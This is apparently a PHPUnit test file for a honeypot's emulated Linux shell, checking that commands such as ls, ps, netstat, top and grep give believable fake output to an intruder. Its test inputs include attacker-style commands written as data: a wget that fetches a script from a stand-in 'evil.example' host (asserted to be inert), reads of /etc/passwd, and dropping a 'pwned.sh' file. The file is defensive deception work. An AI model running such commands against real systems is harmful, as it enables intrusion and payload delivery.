<?php

declare(strict_types=1);

namespace Funnypot\Tests\Shell;

use Funnypot\Shell\Fs\Draw;
use Funnypot\Shell\Fs\FakeFilesystem;
use Funnypot\Shell\Host\HostFacts;
use Funnypot\Shell\ShellInterpreter;
use Funnypot\Shell\ShellSession;
use PHPUnit\Framework\TestCase;

final class ShellInterpreterTest extends TestCase
{
    private const SEED = 4242;

    private function interp(): ShellInterpreter
    {
        $fs = new FakeFilesystem(Draw::seed("s\0h\0ops"), 'ops', self::SEED);

        return new ShellInterpreter($fs, new HostFacts(self::SEED));
    }

    private function session(): ShellSession
    {
        return new ShellSession('prod-db-07', 'root', 0, 0, '/root', '203.0.113.9');
    }

    public function test_pwd_cd_and_bad_cd(): void
    {
        $i = $this->interp();
        $s = $this->session();
        self::assertSame("/root\n", $i->run('pwd', $s));
        self::assertSame('', $i->run('cd /srv', $s));
        self::assertSame("/srv\n", $i->run('pwd', $s));
        $out = $i->run('cd /nope-zzz', $s);
        self::assertStringContainsString('No such file or directory', $out);
        self::assertSame(1, $s->lastExit);
    }

    public function test_ls_la_has_dot_entries_total_and_scaffold(): void
    {
        $out = $this->interp()->run('ls -la /', $this->session());
        self::assertStringContainsString("\n", $out);
        self::assertStringStartsWith('total ', $out);
        self::assertStringContainsString(' .', $out);   // . and .. present with -a
        self::assertStringContainsString(' etc', $out);
    }

    public function test_cat_pinned_and_proc(): void
    {
        $i = $this->interp();
        self::assertStringContainsString('root:x:0:0:', $i->run('cat /etc/passwd', $this->session()));
        self::assertStringContainsString('processor', $i->run('cat /proc/cpuinfo', $this->session()));
        self::assertStringContainsString('MemTotal', $i->run('cat /proc/meminfo', $this->session()));
    }

    public function test_ps_is_coherent_and_shows_miner(): void
    {
        $out = $this->interp()->run('ps aux', $this->session());
        self::assertStringContainsString('lolMiner', $out);          // miner from HostFacts
        self::assertStringContainsString('mariadbd', $out);          // a normal service
    }

    public function test_host_fact_commands(): void
    {
        $i = $this->interp();
        self::assertStringContainsString('Mem:', $i->run('free -m', $this->session()));
        self::assertStringContainsString('Mounted on', $i->run('df -h', $this->session()));
        self::assertStringContainsString('Linux', $i->run('uname -a', $this->session()));
        self::assertSame("root\n", $i->run('whoami', $this->session()));
    }

    public function test_netstat_shows_attacker_own_session(): void
    {
        $out = $this->interp()->run('netstat -tn', $this->session());
        self::assertStringContainsString('203.0.113.9:', $out);      // the peer's own connection
        self::assertStringContainsString('ESTABLISHED', $out);
    }

    public function test_exit_status_and_unknown_command(): void
    {
        $i = $this->interp();
        $s = $this->session();
        self::assertSame("hi\n", $i->run('echo hi', $s));
        self::assertSame("0\n", $i->run('echo $?', $s));
        $out = $i->run('frobnicate --now', $s);
        self::assertStringContainsString('command not found', $out);
        self::assertSame(127, $s->lastExit);
        self::assertSame("127\n", $i->run('echo $?', $s));
    }

    public function test_writes_reflect_in_session_then_rm(): void
    {
        $i = $this->interp();
        $s = $this->session();
        $i->run('touch /tmp/pwned.sh', $s);
        self::assertStringContainsString('pwned.sh', $i->run('ls /tmp', $s));
        $i->run('rm /tmp/pwned.sh', $s);
        self::assertStringNotContainsString('pwned.sh', $i->run('ls /tmp', $s));
    }

    public function test_write_denied_under_proc(): void
    {
        $s = $this->session();
        $out = $this->interp()->run('mkdir /proc/evil', $s);
        self::assertStringContainsString('Read-only file system', $out);
        self::assertSame(1, $s->lastExit);
    }

    public function test_pipe_grep_filters_producer(): void
    {
        $out = $this->interp()->run('cat /etc/passwd | grep root', $this->session());
        self::assertStringContainsString('root', $out);
        self::assertStringNotContainsString('nobody', $out);
    }

    public function test_find_reaches_pinned_file(): void
    {
        $out = $this->interp()->run('find /etc -name passwd', $this->session());
        self::assertStringContainsString('/etc/passwd', $out);
    }

    public function test_wget_is_inert_canned(): void
    {
        $out = $this->interp()->run('wget http://evil.example/x.sh', $this->session());
        self::assertStringContainsString('index.html', $out); // canned progress, nothing fetched
    }

    public function test_exit_closes(): void
    {
        $s = $this->session();
        $this->interp()->run('exit', $s);
        self::assertTrue($s->close);
    }

    public function test_history_records_typed_commands(): void
    {
        $i = $this->interp();
        $s = $this->session();
        $i->run('whoami', $s);
        $i->run('id', $s);
        $out = $i->run('history', $s);
        self::assertStringContainsString('whoami', $out);
        self::assertStringContainsString('id', $out);
    }

    // ---- fable review regressions ----

    public function test_top_renders_real_values_not_a_stub(): void
    {
        $out = $this->interp()->run('top', $this->session());
        self::assertStringContainsString('%Cpu(s):', $out);
        self::assertStringContainsString('MiB Mem :', $out);
        self::assertStringNotContainsString('busy', $out);
        self::assertMatchesRegularExpression('/\d+\.\d+ us/', $out);
    }

    public function test_ls_is_sorted_by_name(): void
    {
        $line = trim($this->interp()->run('ls /', $this->session()));
        $names = preg_split('/\s+/', $line);
        $sorted = $names;
        sort($sorted, SORT_STRING);
        self::assertSame($sorted, $names, 'ls output must be name-sorted');
    }

    public function test_mkdir_then_ls_is_empty(): void
    {
        $i = $this->interp();
        $s = $this->session();
        $i->run('mkdir /root/brandnew', $s);
        self::assertStringContainsString('brandnew', $i->run('ls /root', $s));
        self::assertSame('', $i->run('ls /root/brandnew', $s), 'a just-created dir must be empty');
    }

    public function test_uname_flags(): void
    {
        $i = $this->interp();
        self::assertSame("x86_64\n", $i->run('uname -m', $this->session()));
        self::assertSame("GNU/Linux\n", $i->run('uname -o', $this->session()));
        self::assertSame($i->run('hostname', $this->session()), $i->run('uname -n', $this->session()));
    }

    public function test_netstat_has_one_ssh_established_and_no_phantom(): void
    {
        $out = $this->interp()->run('netstat -tn', $this->session());
        self::assertStringContainsString('203.0.113.9', $out);            // the attacker's own peer
        self::assertStringNotContainsString('10.0.0.5:51334', $out);      // the old hardcoded phantom is gone
    }

    public function test_cp_and_mv_to_proc_denied(): void
    {
        $i = $this->interp();
        $s = $this->session();
        self::assertStringContainsString('Read-only file system', $i->run('cp /etc/hostname /proc/evil', $s));
        self::assertStringContainsString('Read-only file system', $i->run('mv /etc/hostname /sys/x', $s));
    }

    public function test_grep_is_case_sensitive_with_i_flag(): void
    {
        $i = $this->interp();
        self::assertSame('', $i->run('grep Root /etc/passwd', $this->session()));       // case-sensitive: no match
        self::assertStringContainsString('root', $i->run('grep root /etc/passwd', $this->session()));
        self::assertStringContainsString('root', $i->run('grep -i Root /etc/passwd', $this->session()));
    }

    public function test_ls_l_on_a_file_shows_detail_line(): void
    {
        $out = $this->interp()->run('ls -l /etc/passwd', $this->session());
        self::assertStringContainsString('-rw-r--r--', $out);
        self::assertStringContainsString('passwd', $out);
        self::assertStringContainsString('root', $out);
    }

    public function test_short_circuit_operators(): void
    {
        $i = $this->interp();
        $s = $this->session();
        self::assertStringNotContainsString('SHOULDNOT', $i->run('cat /nonexistent-zzz && echo SHOULDNOT', $s));
        self::assertStringContainsString('YES', $i->run('true && echo YES', $s));
        self::assertStringContainsString('REC', $i->run('false || echo REC', $s));
        self::assertStringNotContainsString('NOPE', $i->run('true || echo NOPE', $s));
    }

    public function test_bracket_test_gates_next_command(): void
    {
        $i = $this->interp();
        $s = $this->session();
        self::assertStringContainsString('FOUND', $i->run('[ -f /etc/passwd ] && echo FOUND', $s));
        self::assertStringNotContainsString('NOPE', $i->run('[ -f /nope-zzz ] && echo NOPE', $s));
    }

    public function test_ls_l_resolves_named_users_not_bare_uids(): void
    {
        // /etc is root-owned; ls -l must show "root", never a bare uid, from the /etc/passwd map.
        $out = $this->interp()->run('ls -l /etc', $this->session());
        self::assertStringContainsString('root', $out);
        self::assertDoesNotMatchRegularExpression('/^\S+\s+\d+\s+0\s+0\s/m', $out, 'uid 0 must render as root, not 0');
    }
}
